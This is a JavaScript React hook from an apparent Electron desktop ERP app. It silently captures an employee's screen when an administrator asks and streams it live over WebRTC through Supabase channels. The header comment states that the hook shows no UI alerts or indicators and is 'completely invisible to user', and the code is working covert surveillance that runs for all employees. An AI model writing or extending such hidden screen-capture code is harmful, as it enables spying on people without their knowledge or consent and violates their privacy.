/**
 * Guardian Desktop ERP - Silent Screen Monitor Hook
 * Silently listens for screen monitoring requests from admin
 * NO UI alerts or indicators - completely invisible to user
 */

import { useEffect, useRef, useCallback } from 'react';
import { supabase } from '../services/supabaseClient';

// ICE Server configuration
const ICE_SERVERS = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:stun2.l.google.com:19302' },
  ]
};

const CHANNEL_PREFIX = 'screen-monitor';

/**
 * Hook for silent screen monitoring (used by all employees)
 * This runs in the background and responds to admin monitoring requests
 * @param {string} userId - The current user's employee ID
 */
export function useSilentMonitoring(userId) {
  const peerConnectionRef = useRef(null);
  const localStreamRef = useRef(null);
  const channelRef = useRef(null);
  const responseChannelRef = useRef(null);

  // Get screen stream using Electron desktopCapturer
  const getScreenStream = useCallback(async () => {
    try {
      console.log('[SilentMonitor] Getting screen stream...');
      
      // Try to get screen source from Electron
      if (window.electronAPI?.screen?.getPrimarySource) {
        const source = await window.electronAPI.screen.getPrimarySource();
        console.log('[SilentMonitor] Got screen source:', source?.id);
        
        if (source) {
          try {
            const stream = await navigator.mediaDevices.getUserMedia({
              audio: false,
              video: {
                mandatory: {
                  chromeMediaSource: 'desktop',
                  chromeMediaSourceId: source.id,
                  minWidth: 1280,
                  maxWidth: 1920,
                  minHeight: 720,
                  maxHeight: 1080,
                  maxFrameRate: 15
                }
              }
            });
            console.log('[SilentMonitor] Got desktop stream with tracks:', stream.getTracks().length);
            return stream;
          } catch (desktopErr) {
            console.error('[SilentMonitor] Desktop capture error:', desktopErr);
          }
        }
      }

      // Fallback to getDisplayMedia (may show picker but works more reliably)
      console.log('[SilentMonitor] Falling back to getDisplayMedia...');
      const stream = await navigator.mediaDevices.getDisplayMedia({
        video: {
          width: { ideal: 1920, max: 1920 },
          height: { ideal: 1080, max: 1080 },
          frameRate: { ideal: 15, max: 15 }
        },
        audio: false
      });
      console.log('[SilentMonitor] Got display stream with tracks:', stream.getTracks().length);
      return stream;
    } catch (error) {
      console.error('[SilentMonitor] Error getting screen:', error);
      return null;
    }
  }, []);

  // Send message to admin - simple direct approach with retry
  const sendToAdmin = useCallback(async (event, payload) => {
    if (!userId) {
      console.error('[SilentMonitor] Cannot send - no userId');
      return;
    }
    
    // Wait for response channel to be ready (max 3 seconds)
    let attempts = 0;
    while (!responseChannelRef.current && attempts < 30) {
      await new Promise(r => setTimeout(r, 100));
      attempts++;
    }
    
    if (!responseChannelRef.current) {
      console.error('[SilentMonitor] Response channel not ready after waiting');
      return;
    }
    
    console.log('[SilentMonitor] Sending to admin, event:', event);
    
    try {
      const result = await responseChannelRef.current.send({
        type: 'broadcast',
        event,
        payload
      });
      console.log('[SilentMonitor] Message sent result:', result);
    } catch (err) {
      console.error('[SilentMonitor] Error sending to admin:', err);
    }
  }, [userId]);

  // Handle monitor request from admin
  const handleMonitorRequest = useCallback(async (payload) => {
    try {
      console.log('[SilentMonitor] Processing request silently...');

      // Get screen stream
      const stream = await getScreenStream();
      if (!stream) {
        console.error('[SilentMonitor] Failed to get screen stream');
        return;
      }

      // Verify we have video tracks
      const videoTracks = stream.getVideoTracks();
      console.log('[SilentMonitor] Video tracks:', videoTracks.length, videoTracks.map(t => t.label));
      
      if (videoTracks.length === 0) {
        console.error('[SilentMonitor] No video tracks in stream!');
        return;
      }

      localStreamRef.current = stream;

      // Create peer connection
      const pc = new RTCPeerConnection(ICE_SERVERS);
      peerConnectionRef.current = pc;

      // Add tracks
      stream.getTracks().forEach(track => {
        console.log('[SilentMonitor] Adding track:', track.kind, track.label);
        pc.addTrack(track, stream);
      });

      // Handle ICE candidates - collect and send
      pc.onicecandidate = (event) => {
        if (event.candidate) {
          console.log('[SilentMonitor] ICE candidate generated');
          sendToAdmin('ice-candidate', {
            candidate: event.candidate.toJSON()
          });
        }
      };

      // Connection state logging (silent)
      pc.onconnectionstatechange = () => {
        console.log('[SilentMonitor] Connection state:', pc.connectionState);
        if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed') {
          stopStream();
        }
      };

      pc.oniceconnectionstatechange = () => {
        console.log('[SilentMonitor] ICE connection state:', pc.iceConnectionState);
      };

      // Set remote description (offer from admin)
      await pc.setRemoteDescription(new RTCSessionDescription(payload.offer));
      console.log('[SilentMonitor] Remote description set');

      // Create and send answer
      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);
      console.log('[SilentMonitor] Local description set');

      await sendToAdmin('monitor-answer', {
        answer: pc.localDescription.toJSON()
      });

      console.log('[SilentMonitor] Answer sent successfully');
    } catch (error) {
      console.error('[SilentMonitor] Error in handleMonitorRequest:', error);
    }
  }, [getScreenStream, sendToAdmin]);

  // Handle ICE candidate from admin
  const handleIceCandidate = useCallback(async (payload) => {
    const pc = peerConnectionRef.current;
    if (pc && payload.candidate) {
      try {
        await pc.addIceCandidate(new RTCIceCandidate(payload.candidate));
        console.log('[SilentMonitor] Added ICE candidate from admin');
      } catch (error) {
        console.error('[SilentMonitor] ICE error:', error);
      }
    }
  }, []);

  // Stop stream and cleanup
  const stopStream = useCallback(() => {
    if (localStreamRef.current) {
      localStreamRef.current.getTracks().forEach(track => track.stop());
      localStreamRef.current = null;
    }

    if (peerConnectionRef.current) {
      peerConnectionRef.current.close();
      peerConnectionRef.current = null;
    }

    console.log('[SilentMonitor] Stream stopped');
  }, []);

  // Initialize silent listener
  useEffect(() => {
    if (!userId) {
      console.log('[SilentMonitor] No userId provided, skipping initialization');
      return;
    }

    console.log('[SilentMonitor] Initializing for user:', userId);

    // Create listening channel for admin requests
    const channelName = `${CHANNEL_PREFIX}-${userId}`;
    const responseChannelName = `${CHANNEL_PREFIX}-response-${userId}`;
    
    console.log('[SilentMonitor] Subscribing to channels:', channelName, responseChannelName);
    
    // Create the response channel first and subscribe
    const responseChannel = supabase.channel(responseChannelName);
    responseChannel.subscribe((status) => {
      console.log('[SilentMonitor] Response channel status:', status);
      if (status === 'SUBSCRIBED') {
        responseChannelRef.current = responseChannel;
      }
    });

    // Create listening channel
    const channel = supabase.channel(channelName, {
      config: { broadcast: { self: false } }
    });

    channel
      .on('broadcast', { event: 'monitor-request' }, (msg) => {
        console.log('[SilentMonitor] Received monitor-request!');
        handleMonitorRequest(msg.payload);
      })
      .on('broadcast', { event: 'ice-candidate' }, (msg) => {
        handleIceCandidate(msg.payload);
      })
      .on('broadcast', { event: 'stop-monitoring' }, () => {
        stopStream();
      })
      .subscribe((status) => {
        console.log('[SilentMonitor] Listen channel status:', status, 'for channel:', channelName);
      });

    channelRef.current = channel;

    // Cleanup on unmount
    return () => {
      stopStream();
      if (channelRef.current) {
        channelRef.current.unsubscribe();
        channelRef.current = null;
      }
      if (responseChannelRef.current) {
        responseChannelRef.current.unsubscribe();
        responseChannelRef.current = null;
      }
    };
  }, [userId, handleMonitorRequest, handleIceCandidate, stopStream]);

  // Return nothing - this hook is completely silent
  return null;
}

export default useSilentMonitoring;
